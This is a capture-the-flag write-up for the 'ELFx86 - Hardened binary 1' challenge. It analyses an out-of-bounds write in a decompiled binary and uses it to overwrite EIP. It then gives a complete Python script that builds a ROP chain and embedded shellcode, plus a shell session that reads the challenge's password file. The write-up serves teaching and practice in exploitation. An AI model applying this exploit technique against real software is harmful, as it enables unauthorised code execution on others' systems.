# ELFx86 - Hardened binary 1


## Writeup

Let's static analyse the file using ghidra. Here are the relevant parts:

*main function*
```C
if (file != (FILE *)0x0)
{
 	while (read_len = fgets(buf, 20, file), read_len != (char *)0x0)
 	{
		ll1 = atoll(buf);
		fgets(buf, 20, file);
		ll2 = atoll(buf);
		if (ll1 != 0 && ll2 != 0)
		{
			insert((int)ll2,(int)ll1,inserted_buf);
		}
	}
}
```

*insert function*
```C
*(undefined4 *)(ll2 * 4 + inserted_buf) = ll1;
```

*0xdeadbeef* = 3735928559

```sh
gdb-peda$ p $esp
$85 = (void *) 0xff81ae90
gdb-peda$ p $esp - 0xff81ae80
$88 = (void *) 0x10
gdb-peda$ shell echo "3735928559                 1033               aaa" > /tmp/ch21/ch21.txt
gdb-peda$ r /tmp/ch21/ch21.txt
(...)
0xdeadbeef in ?? ()
```

Now that we have found a way to overwrite **EIP** we can craft a ropchain using our file (index beginning at 1033 and address the code we want to execute at each iteration).

```sh
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : FULL
```

We see that NX is disabled so we can use a jmp esp trampoline to execute our shellcode.
We'll use ```memset@plt``` to populate some writable memory segment with the opcodes for ```jmp esp``` and store the shellcode in the buffer.

````sh
app-systeme-ch21@challenge03:/tmp/ch21$ ~/ch21 ./payload
$ cat .passwd
cat: .passwd: No such file or directory
$ cd /challenges
sh: 2: cd: can't cd to /challenges
$ cd /challenge
$ ls
app-systeme  programmation
$ cd app-systeme/ch21
$ cat .passwd
O...............o
$
````

Our shellcode :
```python
#!/bin/python3
import sys

count = 1033			# saved eip offset from the read buffer
main_leave = 0x080486be
fgets_plt = 0x80483e4
printf_plt = 0x8048434
fopen_plt = 0x8048424
memset_plt = 0x80483f4	# not randomized with PIE off
pppr = 0x08048736		# pop esi; pop edi; pop ebp; ret
writable = 0x0804a008	# rwx region

with open('payload', 'w') as f:
	sys.stdout = f
	print("%19d%18d " * 22 %
		(
			memset_plt, count,
			pppr, count+1,				# pop next 3 instructions and overwrite $eip with the next memset@plt
			writable, count+2,			# r
			0xe4, count+3,
			0x12, count+4,

			memset_plt, count+5,
			pppr, count+6,
			writable+1, count+7,
			0x000000ff, count+8,
			0x02, count+9,

			writable+2, count+10,		# let's be lazy. it works anyway

			0x90909090, count+11,
			0x90909090, count+12,
			0xd231c931, count+13,
			0x90909090, count+14,
			0x6850c031, count+15,
			0x0066662f, count+16,
			0x6d742f68, count+17,
			0x50e38970, count+18,
			0xb0cc8953, count+19,
			0x9080cd0b, count+20,
			0x9080cd0b, count+21
		)
		)

```

## Resources

[Ret2csu - Inf0sec](https://inf0sec.fr/post.php?id=9)
[Advanced ROP Techniques  - Aneesh Dogra](https://anee.me/advanced-rop-techniques-16fd701909b5)
[gdb-peda - github](https://github.com/longld/peda)